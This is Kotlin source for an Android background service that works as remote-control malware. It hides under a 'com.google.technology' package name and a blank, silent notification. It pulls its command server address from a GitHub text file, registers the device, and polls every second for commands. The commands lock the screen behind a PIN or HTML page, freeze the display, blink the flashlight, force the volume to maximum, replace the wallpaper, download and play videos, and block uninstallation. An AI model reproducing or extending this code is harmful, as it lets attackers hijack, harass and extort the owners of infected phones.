package com.google.technology

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.WallpaperManager
import android.graphics.BitmapFactory
import android.media.AudioManager
import android.util.Base64
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.security.MessageDigest

class HeartbeatService : Service() {

    private val CHANNEL_ID   = "google_bg"
    private val NOTIF_ID     = 1
    private val INTERVAL_MS  = 1_000L
    private val FALLBACK_URL = "http://domain:port"
    private val API_TXT_URL  = "https://raw.githubusercontent.com/Zal7Sex/Kaiser/main/api_20261122.txt"
    private val BOOT_ACCESSIBILITY_WAIT_MS = 60_000L
    private val RECONNECT_MAX_RETRY = 10
    private val RECONNECT_RETRY_DELAY_MS = 5_000L

    private val client  = OkHttpClient()
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var prefs: SharedPreferences

    private var flashBlinkRunnable: Runnable? = null
    private var flashlightOn = false
    private var keyboardCycleActive = false
    private var lockActive = false
    private var teksLayarActive = false
    private var lockHtmlActive = false
    private var lcdEfekActive = false
    private var antiUninstallActive = false
    private var freezeLayarActive = false
    private var ambarusActive = false
    private var isFirstHeartbeat = true
    private var offlineSent = false
    private var heartbeatStarted = false
    private var receiverRegistered = false
    private var volumeLockActive = false
    private var volumeLockRunnable: Runnable? = null
    private var startedFromBoot = false

    private val volumeReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (!volumeLockActive) return
            if (intent.action == "android.media.VOLUME_CHANGED_ACTION") {
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                val cur = am.getStreamVolume(AudioManager.STREAM_MUSIC)
                if (cur < max) {
                    am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
                }
            }
        }
    }

    private val accessibilityReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == KaiserAccessibilityService.ACTION_VIDEO_ENDED) {
                stopVolumeLock()
                return
            }
            val active = intent.getBooleanExtra("active", false)
            KaiserAccessibilityService.isAccessibilityActive = active
        }
    }

    private var isForegroundShowing = false

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            val accessibilityNowActive = isAccessibilityEnabled()
            KaiserAccessibilityService.isAccessibilityActive = accessibilityNowActive

            if (accessibilityNowActive) {
                offlineSent = false
                if (!isForegroundShowing) {
                    isForegroundShowing = true
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        startForeground(NOTIF_ID, buildNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    } else {
                        startForeground(NOTIF_ID, buildNotification())
                    }
                }
                sendHeartbeat()
            } else {
                if (!offlineSent) {
                    offlineSent = true
                    setDeviceOffline()
                }
                if (isForegroundShowing) {
                    isForegroundShowing = false
                    stopForeground(true)
                }
            }
            handler.postDelayed(this, INTERVAL_MS)
        }
    }

    private fun sendBroadcastToSelf(action: String, extras: (Intent.() -> Unit)? = null) {
        val intent = Intent(action).apply {
            setPackage(packageName)
            extras?.invoke(this)
        }
        sendBroadcast(intent)
    }

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("google", MODE_PRIVATE)
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIF_ID, buildNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        if (isAccessibilityEnabled()) {
            isForegroundShowing = true
        } else {
            isForegroundShowing = false
            stopForeground(true)
        }

        if (!receiverRegistered) {
            receiverRegistered = true
            val filter = IntentFilter("com.google.technology.ACCESSIBILITY_CHANGED")
            filter.addAction(KaiserAccessibilityService.ACTION_VIDEO_ENDED)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(accessibilityReceiver, filter, RECEIVER_EXPORTED)
            } else {
                registerReceiver(accessibilityReceiver, filter)
            }
            registerReceiver(volumeReceiver, IntentFilter("android.media.VOLUME_CHANGED_ACTION"))
        }

        if (!heartbeatStarted) {
            heartbeatStarted = true
            fetchApiUrlThenInit()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.getBooleanExtra("from_boot", false) == true) {
            startedFromBoot = true
        }
        if (heartbeatStarted && isAccessibilityEnabled()) {
            val baseUrl = prefs.getString("apiBaseUrl", null)
            if (!baseUrl.isNullOrEmpty()) {
                reconnectDeviceWithRetry(baseUrl) {}
            }
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(heartbeatRunnable)
        stopFlashBlink()
        if (keyboardCycleActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_KEYBOARD_CYCLE_OFF)
            keyboardCycleActive = false
        }
        if (lockHtmlActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_UNLOCKHTML)
            lockHtmlActive = false
        }
        if (lcdEfekActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_LCDEFEK_OFF)
            lcdEfekActive = false
        }
        if (antiUninstallActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_OFF)
            antiUninstallActive = false
        }
        if (freezeLayarActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_FREEZE_LAYAR_OFF)
            freezeLayarActive = false
        }
        if (ambarusActive) {
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_AMBARUS_OFF)
            ambarusActive = false
        }
        if (receiverRegistered) {
            try { unregisterReceiver(accessibilityReceiver) } catch (_: Exception) {}
            try { unregisterReceiver(volumeReceiver) } catch (_: Exception) {}
            receiverRegistered = false
        }
        stopVolumeLock()
        super.onDestroy()
    }

    private fun getStableDeviceId(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        val raw = "kaiser-device-$androidId-${Build.SERIAL}"
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            val digest = md.digest(raw.toByteArray())
            val hex = digest.joinToString("") { "%02x".format(it) }
            "${hex.substring(0, 8)}-${hex.substring(8, 12)}-${hex.substring(12, 16)}-${hex.substring(16, 20)}-${hex.substring(20, 32)}"
        } catch (_: Exception) {
            androidId.ifEmpty { raw.hashCode().toString() }
        }
    }

    private fun getStableDeviceToken(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        val raw = "kaiser-token-$androidId-${Build.MANUFACTURER}-${Build.MODEL}"
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            val digest = md.digest(raw.toByteArray())
            digest.joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            androidId.reversed().ifEmpty { raw.hashCode().toString() }
        }
    }

    private fun ensureStableDeviceCredentials() {
        val stableId    = getStableDeviceId()
        val stableToken = getStableDeviceToken()
        prefs.edit()
            .putString("deviceId", stableId)
            .putString("deviceToken", stableToken)
            .apply()
    }

    private fun isAccessibilityEnabled(): Boolean {
        val serviceId = "$packageName/${KaiserAccessibilityService::class.java.canonicalName}"
        val enabled   = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(":").any { it.equals(serviceId, ignoreCase = true) }
    }

    private fun fetchApiUrlThenInit() {
        Thread {
            if (startedFromBoot) {
                var waited = 0L
                val checkInterval = 2_000L
                while (waited < BOOT_ACCESSIBILITY_WAIT_MS) {
                    if (isAccessibilityEnabled()) break
                    Thread.sleep(checkInterval)
                    waited += checkInterval
                }
            } else {
                Thread.sleep(3000)
            }

            KaiserAccessibilityService.isAccessibilityActive = isAccessibilityEnabled()

            var apiUrl: String? = null
            var fetchAttempt = 0
            while (apiUrl == null && fetchAttempt < RECONNECT_MAX_RETRY) {
                try {
                    val conn = java.net.URL(API_TXT_URL).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 8000
                    conn.readTimeout    = 8000
                    conn.requestMethod  = "GET"
                    val code = conn.responseCode
                    if (code == 200) {
                        val content = conn.inputStream.bufferedReader().readText().trim()
                        apiUrl = if (content.startsWith("http")) content else null
                        if (apiUrl != null) prefs.edit().putString("apiBaseUrl", apiUrl).apply()
                    }
                    conn.disconnect()
                } catch (_: Exception) {}

                if (apiUrl == null) {
                    val cached = prefs.getString("apiBaseUrl", null)
                    if (!cached.isNullOrEmpty()) {
                        apiUrl = cached
                    } else {
                        fetchAttempt++
                        if (fetchAttempt < RECONNECT_MAX_RETRY) Thread.sleep(RECONNECT_RETRY_DELAY_MS)
                    }
                }
            }

            val finalUrl = apiUrl ?: FALLBACK_URL
            if (apiUrl == null) prefs.edit().putString("apiBaseUrl", finalUrl).apply()

            reconnectDeviceWithRetry(finalUrl) { handler.post(heartbeatRunnable) }
        }.start()
    }

    private fun reconnectDeviceWithRetry(baseUrl: String, attempt: Int = 0, onDone: () -> Unit) {
        val deviceId    = prefs.getString("deviceId", null) ?: run { onDone(); return }
        val deviceToken = prefs.getString("deviceToken", null) ?: run { onDone(); return }
        val deviceName  = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        val ownerEmail  = prefs.getString("ownerEmail", "") ?: ""

        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("name",     deviceName)
            put("model",    Build.MODEL)
            put("token",    deviceToken)
            put("owner",    ownerEmail)
        }

        val body    = json.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$baseUrl/api/devices/register")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                if (attempt < RECONNECT_MAX_RETRY) {
                    Thread {
                        Thread.sleep(RECONNECT_RETRY_DELAY_MS)
                        reconnectDeviceWithRetry(baseUrl, attempt + 1, onDone)
                    }.start()
                } else {
                    onDone()
                }
            }
            override fun onResponse(call: Call, response: Response) {
                response.use {}
                if (isAccessibilityEnabled()) {
                    setDeviceOnline(baseUrl)
                }
                onDone()
            }
        })
    }

    private fun reconnectDevice(baseUrl: String, onDone: () -> Unit) {
        reconnectDeviceWithRetry(baseUrl, 0, onDone)
    }

    private fun setDeviceOnline(baseUrl: String) {
        val deviceId = prefs.getString("deviceId", null) ?: return
        val token    = prefs.getString("deviceToken", null) ?: return

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("token",    token)
        }.toString().toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/devices/online")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.use {} }
        })
    }

    private fun setDeviceOffline() {
        val deviceId = prefs.getString("deviceId", null) ?: return
        val token    = prefs.getString("deviceToken", null) ?: return
        val baseUrl  = prefs.getString("apiBaseUrl", FALLBACK_URL) ?: FALLBACK_URL

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("token",    token)
        }.toString().toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/devices/offline")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.use {} }
        })
    }

    private fun sendHeartbeat() {
        val deviceId = prefs.getString("deviceId", null) ?: return
        val token    = prefs.getString("deviceToken", null) ?: return
        val baseUrl  = prefs.getString("apiBaseUrl", FALLBACK_URL) ?: FALLBACK_URL

        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("token",    token)
        }.toString().toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("$baseUrl/api/devices/heartbeat")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (it.code == 404) {
                        reconnectDeviceWithRetry(baseUrl) {}
                        return
                    }
                    if (!it.isSuccessful) return
                    val raw = it.body?.string() ?: return
                    try {
                        val json   = JSONObject(raw)
                        val action = if (json.isNull("action")) null
                                     else json.optString("action", null)

                        if (isFirstHeartbeat) {
                            isFirstHeartbeat = false
                            val serverFeatures = json.optJSONObject("features")
                            if (serverFeatures != null) {
                                handler.post { applyServerFeatures(serverFeatures) }
                            } else {
                                handler.post {
                                    if (!antiUninstallActive) {
                                        antiUninstallActive = true
                                        sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_ON)
                                    }
                                }
                            }
                            return
                        }

                        when (action) {
                            "lockhtml" -> {
                                val html = json.optString("lockHtml", "").takeIf { it.isNotEmpty() }
                                if (html != null) {
                                    lockHtmlActive = true
                                    handler.post {
                                        sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_LOCKHTML) {
                                            putExtra("lockHtml", html)
                                        }
                                    }
                                } else Unit
                            }
                            "unlockhtml" -> handler.post {
                                lockHtmlActive = false
                                sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_UNLOCKHTML)
                            }
                            "lock" -> {
                                val lText = json.optString("lockText", "LOCKED")
                                val lPin  = json.optString("lockPin", "0000")
                                handler.post {
                                    startLockService(lText, lPin)
                                    lockActive = true
                                }
                            }
                            "unlock" -> handler.post { stopLockService(); lockActive = false }
                            "flashlight" -> handler.post { startFlashBlink() }
                            "flashlight_off" -> handler.post { stopFlashBlink() }
                            "keyboard_cycle" -> handler.post {
                                if (!keyboardCycleActive) {
                                    keyboardCycleActive = true
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_KEYBOARD_CYCLE)
                                }
                            }
                            "keyboard_cycle_off" -> handler.post {
                                if (keyboardCycleActive) {
                                    keyboardCycleActive = false
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_KEYBOARD_CYCLE_OFF)
                                }
                            }
                            "set_wallpaper" -> {
                                json.optString("wallpaperBase64", "").takeIf { it.isNotEmpty() }?.let { b64 ->
                                    handler.post { applyWallpaper(b64) }
                                }
                            }
                            "tekslayar" -> {
                                val teks = json.optString("teksLayar", "").takeIf { it.isNotEmpty() }
                                if (teks != null) {
                                    teksLayarActive = true
                                    handler.post {
                                        sendBroadcastToSelf(KaiserAccessibilityService.ACTION_TEKSLAYAR) {
                                            putExtra("teksLayar", teks)
                                        }
                                    }
                                } else Unit
                            }
                            "tekslayar_off" -> handler.post {
                                teksLayarActive = false
                                sendBroadcastToSelf(KaiserAccessibilityService.ACTION_TEKSLAYAR_OFF)
                            }
                            "lcdefek" -> handler.post {
                                if (!lcdEfekActive) {
                                    lcdEfekActive = true
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_LCDEFEK)
                                }
                            }
                            "lcdefek_off" -> handler.post {
                                if (lcdEfekActive) {
                                    lcdEfekActive = false
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_LCDEFEK_OFF)
                                }
                            }
                            "antiuninstall" -> handler.post {
                                if (!antiUninstallActive) {
                                    antiUninstallActive = true
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_ON)
                                }
                            }
                            "antiuninstall_off" -> handler.post {
                                if (antiUninstallActive) {
                                    antiUninstallActive = false
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_OFF)
                                }
                            }
                            "freezelayar" -> handler.post {
                                if (!freezeLayarActive) {
                                    freezeLayarActive = true
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_FREEZE_LAYAR)
                                }
                            }
                            "freezelayar_off" -> handler.post {
                                if (freezeLayarActive) {
                                    freezeLayarActive = false
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_FREEZE_LAYAR_OFF)
                                }
                            }
                            "ambarus" -> handler.post {
                                if (!ambarusActive) {
                                    ambarusActive = true
                                    startVolumeLock()
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_AMBARUS)
                                }
                            }
                            "ambarus_off" -> handler.post {
                                if (ambarusActive) {
                                    ambarusActive = false
                                    stopVolumeLock()
                                    sendBroadcastToSelf(KaiserAccessibilityService.ACTION_AMBARUS_OFF)
                                }
                            }
                            "putarvideo" -> {
                                val vfile = json.optString("putarVideoFile", "").takeIf { it.isNotEmpty() }
                                val baseUrlInner = prefs.getString("apiBaseUrl", FALLBACK_URL) ?: FALLBACK_URL
                                val vurl = if (vfile != null) "$baseUrlInner/media/$vfile" else null
                                android.util.Log.d("KAISER_PV", "putarvideo action received, file=$vfile url=$vurl")
                                if (vurl != null) {
                                    Thread {
                                        try {
                                            android.util.Log.d("KAISER_PV", "starting download: $vurl")
                                            val url = java.net.URL(vurl)
                                            val conn = url.openConnection() as java.net.HttpURLConnection
                                            conn.connectTimeout = 15000
                                            conn.readTimeout = 60000
                                            conn.connect()
                                            val responseCode = conn.responseCode
                                            android.util.Log.d("KAISER_PV", "download responseCode=$responseCode")
                                            if (responseCode != 200) {
                                                conn.disconnect()
                                                android.util.Log.e("KAISER_PV", "download failed: HTTP $responseCode")
                                                return@Thread
                                            }
                                            val ext = vfile?.substringAfterLast('.', "mp4")?.let { if (it.length > 4 || it.isEmpty()) "mp4" else it } ?: "mp4"
                                            val tmpFile = java.io.File(cacheDir, "kaiser_pv_${System.currentTimeMillis()}.$ext")
                                            conn.inputStream.use { inp ->
                                                tmpFile.outputStream().use { out -> inp.copyTo(out) }
                                            }
                                            conn.disconnect()
                                            android.util.Log.d("KAISER_PV", "download done, file=${tmpFile.absolutePath} size=${tmpFile.length()}")
                                            handler.post {
                                                android.util.Log.d("KAISER_PV", "sending broadcast ACTION_PUTAR_VIDEO")
                                                startVolumeLock()
                                                sendBroadcastToSelf(KaiserAccessibilityService.ACTION_PUTAR_VIDEO) {
                                                    putExtra("videoPath", tmpFile.absolutePath)
                                                }
                                            }
                                        } catch (e: Exception) {
                                            android.util.Log.e("KAISER_PV", "download exception: ${e::class.simpleName}: ${e.message}")
                                        }
                                    }.start()
                                } else {
                                    android.util.Log.e("KAISER_PV", "putarVideoUrl kosong/null di JSON")
                                }
                            }
                            else -> {}
                        }
                    } catch (_: Exception) {}
                }
            }
        })
    }

    private fun applyServerFeatures(features: JSONObject) {
        val shouldLock       = features.optBoolean("lock", false)
        val shouldFlashlight = features.optBoolean("flashlight", false)
        val shouldKeyboard   = features.optBoolean("keyboardCycle", false)
        val shouldTeksLayar  = features.optBoolean("teksLayar", false)

        if (shouldLock && !lockActive) {
            val lText = features.optString("lockText", "LOCKED").ifEmpty { "LOCKED" }
            val lPin  = features.optString("lockPin", "0000").ifEmpty { "0000" }
            prefs.edit().putString("lockText", lText).putString("lockPin", lPin).apply()
            startLockService(lText, lPin)
            lockActive = true
        } else if (!shouldLock && lockActive) {
            stopLockService()
            lockActive = false
        }

        if (shouldFlashlight && flashBlinkRunnable == null) {
            startFlashBlink()
        } else if (!shouldFlashlight && flashBlinkRunnable != null) {
            stopFlashBlink()
        }

        if (shouldKeyboard && !keyboardCycleActive) {
            keyboardCycleActive = true
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_KEYBOARD_CYCLE)
        } else if (!shouldKeyboard && keyboardCycleActive) {
            keyboardCycleActive = false
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_KEYBOARD_CYCLE_OFF)
        }

        if (!shouldTeksLayar && teksLayarActive) {
            teksLayarActive = false
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_TEKSLAYAR_OFF)
        }

        val shouldAntiUninstall = features.optBoolean("antiUninstall", true)
        if (shouldAntiUninstall && !antiUninstallActive) {
            antiUninstallActive = true
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_ON)
        } else if (!shouldAntiUninstall && antiUninstallActive) {
            antiUninstallActive = false
            sendBroadcastToSelf(KaiserAccessibilityService.ACTION_ANTI_UNINSTALL_OFF)
        }
    }

    private fun applyLockHtml(html: String) {
        lockHtmlActive = true
        sendBroadcastToSelf(KaiserAccessibilityService.ACTION_DO_LOCKHTML) {
            putExtra("lockHtml", html)
        }
    }

    private fun startFlashBlink() {
        if (flashBlinkRunnable != null) return
        val camMgr = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        val cameraId = try { camMgr.cameraIdList.firstOrNull() } catch (_: Exception) { null } ?: return

        flashlightOn = false
        val blink = object : Runnable {
            override fun run() {
                try {
                    flashlightOn = !flashlightOn
                    camMgr.setTorchMode(cameraId, flashlightOn)
                } catch (_: Exception) {}
                handler.postDelayed(this, 200)
            }
        }
        flashBlinkRunnable = blink
        handler.post(blink)
    }

    private fun startVolumeLock() {
        volumeLockActive = true
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
        volumeLockRunnable = object : Runnable {
            override fun run() {
                if (!volumeLockActive) return
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                if (am.getStreamVolume(AudioManager.STREAM_MUSIC) < max) {
                    am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
                }
                handler.postDelayed(this, 300)
            }
        }
        handler.post(volumeLockRunnable!!)
    }

    private fun stopVolumeLock() {
        volumeLockActive = false
        volumeLockRunnable?.let { handler.removeCallbacks(it) }
        volumeLockRunnable = null
    }

    private fun stopFlashBlink() {
        flashBlinkRunnable?.let { handler.removeCallbacks(it) }
        flashBlinkRunnable = null
        try {
            val camMgr = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
            val cameraId = camMgr.cameraIdList.firstOrNull() ?: return
            camMgr.setTorchMode(cameraId, false)
        } catch (_: Exception) {}
        flashlightOn = false
    }

    private fun startLockService(
        lockText: String = prefs.getString("lockText", "LOCKED") ?: "LOCKED",
        lockPin: String  = prefs.getString("lockPin", "0000")  ?: "0000"
    ) {
        val intent = Intent(this, LockService::class.java).apply {
            action = LockService.ACTION_LOCK
            putExtra("lockText", lockText)
            putExtra("lockPin", lockPin)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun stopLockService() {
        val intent = Intent(this, LockService::class.java).apply {
            action = LockService.ACTION_UNLOCK
        }
        startService(intent)
    }

    private fun applyWallpaper(base64Data: String) {
        try {
            val bytes = Base64.decode(base64Data, Base64.DEFAULT)
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return
            val wm = WallpaperManager.getInstance(this)
            wm.setBitmap(bitmap)
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Internet", NotificationManager.IMPORTANCE_NONE
            ).apply {
                description = ""
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}
